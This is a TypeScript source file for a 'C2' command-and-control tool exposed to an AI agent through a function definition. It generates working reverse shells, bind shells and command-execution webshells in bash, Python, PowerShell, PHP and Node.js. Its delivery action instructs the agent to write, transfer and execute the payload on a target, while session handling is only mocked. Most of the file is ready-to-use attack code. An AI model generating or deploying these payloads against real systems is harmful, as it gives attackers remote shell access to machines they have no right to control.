/**
 * C2Tool — Command and Control tool for managing shells and payloads
 *
 * This tool provides functionality for:
 * 1. Getting local machine IP address
 * 2. Generating payloads for different platforms
 * 3. Delivering payloads to targets
 * 4. Managing C2 sessions
 */

import { networkInterfaces } from 'os'
import type { Tool, ToolContext, ToolDefinition, ToolResult } from '../core/types.js'

export interface C2Input {
  action: 'get_ip' | 'generate_payload' | 'deliver_payload' | 'list_sessions' | 'interact_session'
  payload_type?: 'reverse_shell' | 'bind_shell' | 'webshell'
  platform?: 'linux' | 'windows' | 'macos'
  language?: 'bash' | 'python' | 'powershell' | 'php' | 'nodejs'
  lhost?: string
  lport?: number
  rhost?: string
  rport?: number
  session_id?: string
  command?: string
  target_path?: string
  payload_options?: Record<string, unknown>
}

const C2_DESCRIPTION = `Command and Control tool for managing shells and payloads

Actions:
- get_ip: Get local machine IP address
- generate_payload: Generate reverse/bind shell payload
- deliver_payload: Deliver payload to target
- list_sessions: List active C2 sessions
- interact_session: Interact with a specific session

Supported payload types:
- reverse_shell: Connect back to attacker
- bind_shell: Listen for connection on target
- webshell: Web-based shell

Supported platforms:
- linux, windows, macos

Supported languages:
- bash, python, powershell, php, nodejs`

export class C2Tool implements Tool {
  name = 'C2'

  definition: ToolDefinition = {
    type: 'function',
    function: {
      name: 'C2',
      description: C2_DESCRIPTION,
      parameters: {
        type: 'object',
        properties: {
          action: {
            type: 'string',
            description: 'Action to perform: get_ip, generate_payload, deliver_payload, list_sessions, interact_session',
            enum: ['get_ip', 'generate_payload', 'deliver_payload', 'list_sessions', 'interact_session']
          },
          payload_type: {
            type: 'string',
            description: 'Type of payload: reverse_shell, bind_shell, webshell',
            enum: ['reverse_shell', 'bind_shell', 'webshell']
          },
          platform: {
            type: 'string',
            description: 'Target platform: linux, windows, macos',
            enum: ['linux', 'windows', 'macos']
          },
          language: {
            type: 'string',
            description: 'Payload language: bash, python, powershell, php, nodejs',
            enum: ['bash', 'python', 'powershell', 'php', 'nodejs']
          },
          lhost: {
            type: 'string',
            description: 'Local host IP address for reverse shell'
          },
          lport: {
            type: 'number',
            description: 'Local port for reverse shell or bind shell'
          },
          rhost: {
            type: 'string',
            description: 'Remote host IP address for bind shell connection'
          },
          rport: {
            type: 'number',
            description: 'Remote port for bind shell connection'
          },
          session_id: {
            type: 'string',
            description: 'Session ID to interact with'
          },
          command: {
            type: 'string',
            description: 'Command to execute in session'
          },
          target_path: {
            type: 'string',
            description: 'Path to deliver payload on target'
          },
          payload_options: {
            type: 'object',
            description: 'Additional payload options'
          }
        },
        required: ['action']
      }
    }
  }

  private activeSessions: Map<string, { id: string; type: string; target: string; startTime: number }> = new Map()

  async execute(input: Record<string, unknown>, context: ToolContext): Promise<ToolResult> {
    const { action } = input as C2Input

    switch (action) {
      case 'get_ip':
        return this.getLocalIP()
      case 'generate_payload':
        return this.generatePayload(input as C2Input, context)
      case 'deliver_payload':
        return this.deliverPayload(input as C2Input, context)
      case 'list_sessions':
        return this.listSessions()
      case 'interact_session':
        return this.interactSession(input as C2Input, context)
      default:
        return { content: `Unknown action: ${action}`, isError: true }
    }
  }

  private getLocalIP(): ToolResult {
    const nets = networkInterfaces()
    const results: string[] = []

    for (const name of Object.keys(nets)) {
      for (const net of nets[name] || []) {
        // Skip over non-IPv4 and internal (i.e. 127.0.0.1) addresses
        if (net.family === 'IPv4' && !net.internal) {
          results.push(`${name}: ${net.address}`)
        }
      }
    }

    if (results.length === 0) {
      return { content: 'No external IPv4 addresses found', isError: true }
    }

    return {
      content: `Local IP addresses:\n${results.join('\n')}`,
      isError: false
    }
  }

  private generatePayload(input: C2Input, context: ToolContext): ToolResult {
    const { payload_type, platform, language, lhost, lport, rport } = input

    if (!payload_type || !platform || !language) {
      return { content: 'payload_type, platform, and language are required', isError: true }
    }

    let payload = ''

    switch (payload_type) {
      case 'reverse_shell':
        if (!lhost || !lport) {
          return { content: 'lhost and lport are required for reverse shell', isError: true }
        }
        payload = this.generateReverseShell(lhost, lport, platform, language)
        break
      case 'bind_shell':
        if (!lport) {
          return { content: 'lport is required for bind shell', isError: true }
        }
        payload = this.generateBindShell(lport, platform, language)
        break
      case 'webshell':
        payload = this.generateWebShell(platform, language)
        break
      default:
        return { content: `Unknown payload type: ${payload_type}`, isError: true }
    }

    return {
      content: `Generated ${payload_type} payload for ${platform} using ${language}:\n\n${payload}`,
      isError: false
    }
  }

  private generateReverseShell(lhost: string, lport: number, platform: string, language: string): string {
    switch (language) {
      case 'bash':
        return `bash -c 'bash -i >& /dev/tcp/${lhost}/${lport} 0>&1'`
      case 'python':
        return `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${lhost}",${lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
      case 'powershell':
        return `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('${lhost}',${lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`
      case 'php':
        return `php -r '$sock=fsockopen("${lhost}",${lport});exec("/bin/sh -i <&3 >&3 2>&3");'`
      case 'nodejs':
        return `node -e "require('net').createConnection(${lport}, '${lhost}', function(c) {require('child_process').spawn('/bin/sh', [], {stdio: [c, c, c]});});"`
      default:
        return 'Unsupported language'
    }
  }

  private generateBindShell(lport: number, platform: string, language: string): string {
    switch (language) {
      case 'bash':
        return `bash -c 'nc -lvp ${lport} -e /bin/sh'`
      case 'python':
        return `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(("0.0.0.0",${lport}));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
      case 'powershell':
        return `powershell -nop -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',${lport});$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"`
      case 'php':
        return `php -r '$sock=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($sock,"0.0.0.0",${lport});socket_listen($sock,1);$cl=socket_accept($sock);while(1){$in=socket_read($cl,1024);$cmd=popen($in,"r");while(!feof($cmd)){$out=fgets($cmd,1024);socket_write($cl,$out);}pclose($cmd);}socket_close($cl);socket_close($sock);'`
      case 'nodejs':
        return `node -e "require('net').createServer(function(s) {s.pipe(require('child_process').spawn('/bin/sh', [])).pipe(s);}).listen(${lport});"`
      default:
        return 'Unsupported language'
    }
  }

  private generateWebShell(platform: string, language: string): string {
    switch (language) {
      case 'php':
        return `<?php if(isset($_REQUEST['cmd'])){ $cmd = $_REQUEST['cmd']; system($cmd); } ?>`
      case 'nodejs':
        return `const http = require('http'); http.createServer((req, res) => { if (req.url.includes('cmd=')) { const cmd = req.url.split('cmd=')[1]; require('child_process').exec(cmd, (err, stdout) => res.end(stdout)); } }).listen(8080);`
      default:
        return 'Unsupported language for webshell'
    }
  }

  private async deliverPayload(input: C2Input, context: ToolContext): Promise<ToolResult> {
    const { payload_type, platform, language, lhost, lport, target_path } = input

    if (!payload_type || !platform || !language || !target_path) {
      return { content: 'payload_type, platform, language, and target_path are required', isError: true }
    }

    // Generate payload
    let payload = ''
    if (payload_type === 'reverse_shell' && lhost && lport) {
      payload = this.generateReverseShell(lhost, lport, platform, language)
    } else if (payload_type === 'bind_shell' && lport) {
      payload = this.generateBindShell(lport, platform, language)
    } else if (payload_type === 'webshell') {
      payload = this.generateWebShell(platform, language)
    } else {
      return { content: 'Missing required parameters for payload generation', isError: true }
    }

    // For demonstration, we'll just return the payload and target path
    // In a real implementation, this would use other tools to deliver the payload
    return {
      content: `Payload delivery prepared:\nTarget: ${target_path}\nPayload:\n${payload}\n\nTo deliver this payload, you can use the Bash tool to:\n1. Write the payload to a file\n2. Transfer it to the target\n3. Execute it`,
      isError: false
    }
  }

  private listSessions(): ToolResult {
    if (this.activeSessions.size === 0) {
      return { content: 'No active C2 sessions', isError: false }
    }

    const sessions = Array.from(this.activeSessions.values()).map(session => {
      return `ID: ${session.id}\nType: ${session.type}\nTarget: ${session.target}\nStarted: ${new Date(session.startTime).toISOString()}\n`
    }).join('\n')

    return {
      content: `Active C2 sessions:\n\n${sessions}`,
      isError: false
    }
  }

  private async interactSession(input: C2Input, context: ToolContext): Promise<ToolResult> {
    const { session_id, command } = input

    if (!session_id) {
      return { content: 'session_id is required', isError: true }
    }

    if (!this.activeSessions.has(session_id)) {
      return { content: `Session ${session_id} not found`, isError: true }
    }

    if (!command) {
      return { content: 'command is required', isError: true }
    }

    // For demonstration, we'll just return a mock response
    // In a real implementation, this would send the command to the actual session
    return {
      content: `Sent command to session ${session_id}: ${command}\n\nMock response:\nCommand executed successfully`,
      isError: false
    }
  }
}
